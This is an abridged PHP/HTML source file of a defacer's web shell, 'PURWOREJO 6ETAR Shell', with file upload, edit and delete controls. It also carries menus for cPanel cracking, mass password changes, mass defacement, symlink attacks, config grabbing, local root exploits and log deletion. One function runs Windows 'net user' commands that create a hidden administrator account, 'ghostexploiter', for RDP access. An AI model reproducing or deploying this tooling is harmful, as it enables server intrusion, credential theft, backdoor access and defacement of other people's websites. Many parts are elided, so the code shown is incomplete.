...
$password = "f9f28eeab7191ca3c9375d3c0cb393e8"; 
//md5  pass :zaengans
...
?>
<!DOCTYPE HTML>
<center><br><img style="width:300px;" src="https://cdn.uploader.win/demo/19-Jan-2020/ss.png"<br>
</center><html><hr><br><center><font color="red" class="p">PURWOREJO 6ETAR</font><font color="White" class="p"> Shell V.1.8</font><hr></center>
<!--
###############################################################################
--!>
<head>
	<iframe width="0" height="0" src="https://c.top4top.io/m_1479kw99u1.mp3" frameborder="0" allowfullscreen></iframe>
<title>PURWOREJO 6ETAR SHELL</title>
<meta name='author' content='PURWOREJO 6ETAR Shell'>
<meta charset="UTF-8">
<style type='text/css'>
...
<body dir="ltr" alink="#0033FF" background="" bgcolor="#000000" link="grey" text="grey" vlink="#FF0000" onkeydown="return false"><iframe width="0" height="0" src="https://c.top4top.io/m_1479kw99u1.mp3" frameborder="0" allowfullscreen></iframe>
<p></p>
...
.yuk {  box-shadow: 0px 1px 0px 0px #2f4f4f;    background:linear-gradient(to bottom, #000000 5%, #000000 100%);    background-color:#000000;   border-radius:6px;  border:1px solid #b0c4de;   display:inline-block;   cursor:pointer;     color:#00ffee;  font-family:Arial;  font-size:15px;     font-weight:bold;   padding:5px 17px;   text-decoration:none;   text-shadow:0px -1px 0px #1e8fff; } 
.yuk:hover {    background:linear-gradient(to bottom, #000000 5%, #000000 100%);    background-color:#000000; } 
.yuk:active {   position:relative;  top:1px; }

.yuk1 {     box-shadow: 0px 0px 0px 2px #dcdcdc;    background-color:transparent;   border-radius:10px;     border:1px solid #4e6096;   display:inline-block;   cursor:pointer;     color:#b22222;  font-family:Arial;  font-size:13px;     padding:8px 15px;  text-decoration:none;   text-shadow:0px 1px 0px #283966; 
.yuk1:hover {   background-color:transparent; } 
.yuk1:active {  position:relative;  top:1px; } }

hr{
        border: 0;
        height: 1px;
        background-image: linear-gradient(to right, rgba(128, 4, 0, 0), rgba(128, 4, 0, 0.75), rgba(128, 4, 0, 0));
    }
a {
	color: red;
	font-family: 'New Rocker', cursive;
...
a:hover {
	text-shadow: 2px -1px 10px #ff0000;
	color: red;
	text-decoration: none;
}
...
textarea {
	...
	.btn_style{
        ...
        border-spacing: 50px;
        box-shadow: 7px 7px 10px rgb(128, 4, 0);
		background-image: url("https://i.pinimg.com/originals/0a/81/74/0a81749b5d582bb97bdc0063c0b632c8.gif");
	...
	.btn_style:hover{
		...
		box-shadow: 4px 4px 8px rgb(135, 206, 250);
	}
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "upload") {
		...
		print "Upload File: $act
			  ...
			  <input type='submit' value='UP BRO' name='upload'>
			  </form>";
	}
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/ghostexploiter/", exe("net user"))) die(color(1, 1, "[INFO] username 'ghostexploiter' already exists."));

		$add_user   = exe("net user ghostexploiter ghostexploiter /add");
    	$add_groups1 = exe("net localgroup Administrators ghostexploiter /add");
    	$add_groups2 = exe("net localgroup Administrator ghostexploiter /add");
    	$add_groups3 = exe("net localgroup Administrateur ghostexploiter /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "ghostexploiter")."<br>
    	Password: ".color(1, 2, "ghostexploiter")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://xnxx.com/' target='_blank'>".color(1, 2, "PURWOREJO 6ETAR")."</a></center>";
}
	print " <a href='?' class='yuk1'>Home</a> ";
	print " <a href='?dir=".path()."&do=delete' class='yuk1'>Delete Logs</a> ";
	print " <a href='?dir=".path()."&do=kill' class='yuk1'>Kill Me</a> ";
...
function action() {
	...
	print "<center>";
	print "<ul>";
	print " <a href='?dir=".path()."&do=fakeroot' class='yuk'>Fake Root</a> ";
	print " <a href='?dir=".path()."&do=cpanel' class='yuk'>cPanel Crack</a> ";
	print " <a href='?dir=".path()."&do=zoneh' class='yuk'>Zone h</a> ";
	print " <a href='?dir=".path()."&do=defid' class='yuk'>Defacer ID</a> ";
	print " <a href='?dir=".path()."&do=mpc' class='yuk'>Mass Password Change</font></a> ";
	print " <a href='?dir=".path()."&do=mass' class='yuk'>Mass Deface/Delete</a> ";
	print "<br> <a href='?dir=".path()."&do=lre' class='yuk'>Local Root Exploiter</a> ";
	print " <a href='?dir=".path()."&do=server' class='yuk'>symlink server</a> ";
	print " <a href='?dir=".path()."&do=symlink' class='yuk'>symlink 404</a> ";
	print " <a href='?dir=".path()."&do=python' class='yuk'>symlink python</a> ";
	print " <a href='?dir=".path()."&do=grabber' class='yuk'>Grab Config</a> <br>";
	print " <a href='?dir=".path()."&do=adminer' class='yuk'>adminer</a> ";
	print " <a href='?dir=".path()."&do=jumping' class='yuk'>jumping</a> ";
	print "</ul>";
	print "</center>";
	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
...
$nick = $_POST['s1l3nt-404'];
$team = $_POST['Purworejo6etar'];
$sikat = $_POST['sikat'];
$url = explode("\r\n", $_POST['sites']);
if($sikat){
...
@error_reporting(0);
@ini_set('display_errors', 0); 
echo '<center><b><a href="https://www.facebook.com/kufluk.zz">Coded By s1l3nt-404</a></b><br>
	...
	echo "<br><center>Done ... <a href='con7ext_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='s1l3nt-404'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by s1l3nt-404")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='silent001' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='rosse1996' placeholder='pass_baru'><br>
...
';
 ...
 echo "<center><font size=3>Cannot create Symlink</font></center>";
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by PURWOREJO 6ETAR</textarea><br>
	...
	if(file_exists('adminer.php')) {
		...
		if(adminer("https://github.com/vrana/adminer/releases/download/v4.7.5/adminer-4.7.5.php","adminer.php")) {
			echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				print "</textarea><br>
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by PURWJORE 6ETAR</textarea><br>
	...
	elseif(isset($_GET['act'])) {
		...
		elseif($_GET['act'] === 'view') {
			print "<center>Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br></center>";
		...
		elseif($_GET['act'] === 'edit') {
			if($_POST['save']) {
				...
				if($save) {
					$act = color(1, 2, "<center>File Saved!</center>");
				} 
				else {
					$act = color(1, 1, "<center>Permission Denied!</center>");
				}
				print "$act<br>";
			}

			print "<center>Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href=?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
		...
		elseif($_GET['act'] === 'rename') {
			...
			print "<center>Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br></center>";
			print "<form method='post'>
